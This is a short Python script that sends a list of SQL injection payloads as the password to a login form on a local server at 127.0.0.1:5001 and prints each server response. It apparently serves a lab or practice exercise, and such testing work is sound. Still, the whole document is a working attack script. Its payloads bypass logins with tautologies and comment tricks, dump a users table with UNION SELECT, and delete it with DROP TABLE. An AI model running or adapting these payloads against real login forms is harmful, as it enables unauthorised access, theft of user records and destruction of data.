import requests

url = "http://127.0.0.1:5001/"

payloads = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "admin' --",
    "' UNION SELECT * FROM users --",
    "' DROP TABLE users --"
]

for payload in payloads:

    data = {
        "username": "admin",
        "password": payload
    }

    response = requests.post(url, data=data)

    print("Trying SQL Injection:", payload)
    print("Server Response:", response.text)
    print("----------------------------------")